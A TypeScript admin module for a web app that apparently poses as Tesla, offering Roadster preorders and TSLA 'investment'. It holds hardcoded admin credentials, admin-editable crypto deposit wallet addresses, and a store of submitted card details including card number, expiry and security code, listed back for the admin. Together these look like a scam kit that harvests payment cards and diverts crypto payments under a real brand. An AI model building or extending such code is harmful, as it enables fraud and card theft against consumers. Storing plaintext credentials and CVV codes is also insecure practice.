import type { CarModel, Plan } from "@/lib/models";
import type { DepositMethod } from "@/lib/payment-methods";

export const ADMIN_EMAIL = "admin@tesla.app";
export const ADMIN_PASSWORD = "1234Admin5678";

const STORAGE_KEY_PREFIX = "tesla_admin_";

export function isAdminAuthenticated(): boolean {
  if (typeof window === "undefined") return false;
  try {
    const raw = localStorage.getItem(`${STORAGE_KEY_PREFIX}session`);
    if (!raw) return false;
    const session = JSON.parse(raw);
    return Boolean(session?.authenticated && session?.expiresAt && Date.now() < session.expiresAt);
  } catch {
    return false;
  }
}

export function adminLogin(email: string, password: string): boolean {
  if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
    const session = {
      authenticated: true,
      email,
      expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000,
    };
    localStorage.setItem(`${STORAGE_KEY_PREFIX}session`, JSON.stringify(session));
    return true;
  }
  return false;
}

export function adminLogout(): void {
  if (typeof window === "undefined") return;
  localStorage.removeItem(`${STORAGE_KEY_PREFIX}session`);
}

export interface PriceSetting {
  model: string;
  price: string;
}

const DEFAULT_PRICES: Record<string, string> = {
  "Model 3": "$42,490",
  "Model Y": "$44,990",
  "Model S": "$84,990",
  "Model X": "$89,990",
  Cybertruck: "$79,990",
  Cybercab: "$29,990",
  Semi: "$179,990",
  Roadster: "$200,000",
};

export function getPrices(): Record<string, string> {
  if (typeof window === "undefined") return DEFAULT_PRICES;
  try {
    const raw = localStorage.getItem(`${STORAGE_KEY_PREFIX}prices`);
    if (!raw) return DEFAULT_PRICES;
    return { ...DEFAULT_PRICES, ...JSON.parse(raw) };
  } catch {
    return DEFAULT_PRICES;
  }
}

export function setPrices(prices: Record<string, string>): void {
  if (typeof window === "undefined") return;
  localStorage.setItem(`${STORAGE_KEY_PREFIX}prices`, JSON.stringify(prices));
}

const DEFAULT_CRYPTO: Record<string, string> = {
  Bitcoin: "adress1235388",
  USDT: "adress1235388",
  Ethereum: "adress1235388",
};

export function getCryptoDestinations(): Record<string, string> {
  if (typeof window === "undefined") return DEFAULT_CRYPTO;
  try {
    const raw = localStorage.getItem(`${STORAGE_KEY_PREFIX}crypto`);
    if (!raw) return DEFAULT_CRYPTO;
    return { ...DEFAULT_CRYPTO, ...JSON.parse(raw) };
  } catch {
    return DEFAULT_CRYPTO;
  }
}

export function setCryptoDestinations(destinations: Record<string, string>): void {
  if (typeof window === "undefined") return;
  localStorage.setItem(`${STORAGE_KEY_PREFIX}crypto`, JSON.stringify(destinations));
}

export interface PaymentSubmission {
  id: string;
  createdAt: string;
  cardName: string;
  cardNumber: string;
  expiry: string;
  securityCode: string;
  street: string;
  city: string;
  state: string;
  zip: string;
  saveCard: boolean;
}

export function savePaymentSubmission(details: Omit<PaymentSubmission, "id" | "createdAt">): void {
  if (typeof window === "undefined") return;
  try {
    const raw = localStorage.getItem(`${STORAGE_KEY_PREFIX}payments`);
    const submissions: PaymentSubmission[] = raw ? JSON.parse(raw) : [];
    const submission: PaymentSubmission = {
      id: crypto.randomUUID(),
      createdAt: new Date().toISOString(),
      ...details,
    };
    submissions.unshift(submission);
    localStorage.setItem(
      `${STORAGE_KEY_PREFIX}payments`,
      JSON.stringify(submissions.slice(0, 500)),
    );
  } catch {
    // silently ignore storage errors
  }
}

export function getPaymentSubmissions(): PaymentSubmission[] {
  if (typeof window === "undefined") return [];
  try {
    const raw = localStorage.getItem(`${STORAGE_KEY_PREFIX}payments`);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

const DEFAULT_CONTENT: Record<string, string> = {
  heroTitle: "Tesla Roadster — Models and Investments",
  heroDescription: "Preorder the new Tesla Roadster or invest in TSLA from one place.",
  stocksTitle: "Invest in Tesla",
  stocksDescription:
    "Own a piece of the company building electric cars, energy storage and autonomous vehicles. Tesla shares trade publicly on the Nasdaq.",
  reserveTitle: "Preorder the new Roadster",
  reserveDescription: "Deliveries from 2028",
  footerText: "Tesla © 2026 · Concept",
};

export function getWebsiteContent(): Record<string, string> {
  if (typeof window === "undefined") return DEFAULT_CONTENT;
  try {
    const raw = localStorage.getItem(`${STORAGE_KEY_PREFIX}content`);
    if (!raw) return DEFAULT_CONTENT;
    return { ...DEFAULT_CONTENT, ...JSON.parse(raw) };
  } catch {
    return DEFAULT_CONTENT;
  }
}

export function setWebsiteContent(content: Record<string, string>): void {
  if (typeof window === "undefined") return;
  localStorage.setItem(`${STORAGE_KEY_PREFIX}content`, JSON.stringify(content));
}
